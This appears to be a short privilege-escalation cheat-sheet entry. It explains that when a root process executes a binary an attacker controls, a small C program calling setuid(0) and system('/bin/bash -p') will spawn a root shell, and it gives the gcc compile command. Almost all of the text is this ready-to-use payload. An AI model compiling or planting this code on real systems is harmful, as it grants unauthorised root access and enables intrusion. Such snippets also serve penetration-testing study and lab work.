Many instances where some root process executes another process which you can control
- the following C code will spawn a bash shell running as root if this happens

```
int main() {
	setuid(0);
	system("/bin/bash -p");
}


# Compile using
gcc -o <name> <filename.c>
```

